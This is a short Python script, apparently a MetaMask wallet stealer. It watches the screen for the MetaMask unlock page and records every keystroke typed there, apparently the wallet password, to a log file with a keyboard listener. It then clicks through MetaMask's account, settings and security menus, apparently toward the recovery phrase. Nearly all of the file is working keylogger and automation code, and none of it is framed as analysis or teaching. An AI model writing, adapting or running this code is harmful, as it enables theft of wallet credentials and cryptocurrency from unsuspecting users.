from re import T
import pyautogui
import time
from asyncore import write
import pynput
from pynput.keyboard import Key, Listener

keys = []


while True:
    if(pyautogui.locateOnScreen('./img/unlock1.png')):
        print('Open MetaMask')
        def on_press(key):
            global keys
            if(pyautogui.locateOnScreen('./img/unlock2.png')):
                print("Stop")
                write_file(keys)
                keys = []
            keys.append(key)
            print("{0} pressed".format(key))
            

        def write_file(keys):
            with open("log.txt", "a") as f:
                for key in keys:
                    k = str(key).replace("'","")
                    f.write(k)
                return
    
        def on_release(key):
            if key == Key.esc:
                return False
        
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
        
        if(pyautogui.locateOnScreen('./img/unlock6.png')):
            print('Login MetaMask')
            time.sleep(2)
            pyautogui.click(1684,137)
            if(pyautogui.locateOnScreen('./img/unlock3.png')):
                print('My Accounts')
                time.sleep(1)
                pyautogui.click(1397,624)
                if(pyautogui.locateOnScreen('./img/unlock4.png')):
                    print('Settings')
                    time.sleep(1)
                    pyautogui.click(1409,507)
                    if(pyautogui.locateOnScreen('./img/unlock5.png')):
                        print('Security')
                        time.sleep(1)
                        pyautogui.click(1465,400)
        
        

        